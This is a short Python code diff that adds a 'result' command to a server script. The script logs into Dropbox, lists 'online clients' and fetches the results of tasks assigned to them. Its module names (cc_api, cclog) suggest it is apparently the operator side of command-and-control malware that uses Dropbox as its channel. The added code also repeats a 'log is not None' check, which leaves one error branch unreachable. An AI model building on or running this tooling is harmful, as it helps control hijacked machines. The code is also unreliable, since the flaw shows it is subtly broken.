@@ -28,9 +28,19 @@ def handle_local_command(dbx, command, *args):
             log = cclog.log_read(dbx, filename)
             if log is not None and sutil.is_online(log):
                 hosts.append(filename)
-
         print(f"SERVER: listing online clients")
         print(hosts)
+    elif command == 'result':
+        log = cclog.log_read(dbx, args[0])
+        if log is not None:
+            if log is not None:
+                id = int(args[1])
+                result = sutil.get_done_with_id(log, id)
+                print(f"SERVER: result of task {args[1]}: {result}")
+            else:
+                print(f"SERVER: no result for task {args[1]}")
+        else:
+            print(f"SERVER: no log for {args[0]}")
 
 if __name__ == "__main__":
     dbx = cc_api.dropbox_login()
